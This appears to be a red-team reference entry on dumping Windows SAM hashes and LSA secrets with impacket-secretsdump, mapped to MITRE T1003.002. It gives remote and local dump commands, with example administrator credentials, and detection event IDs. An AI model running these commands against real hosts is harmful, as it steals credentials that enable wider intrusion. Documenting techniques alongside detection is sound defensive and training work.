---
id: sam_lsa
type: technique
label: "SAM / LSA secrets dump"
phase: "cred"
tools: ["impacket"]
cve: null
detect: "Registry hive save/read events; VSS shadow-copy creation."
mitre: "T1003.002"
tag: null
---


# SAM / LSA secrets dump

### Affected object / attribute
**Local SAM** and **LSA secrets** on a host.

### Concept (deep)
SAM = local account hashes; LSA secrets = service-account passwords, DPAPI machine keys, cached domain creds. Dump locally (admin) or remotely with `secretsdump`.

### Commands
```bash
# ── Remote secretsdump ───────────────────────────────────────────────
impacket-secretsdump corp.local/administrator:'Password123!'@10.10.10.5

# ── Local hive dump ─────────────────────────────────────────────────
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Detection
**4656/4663** on registry hives `SAM`/`SECURITY`; `reg save` (**4688**); LSA secret access.

---
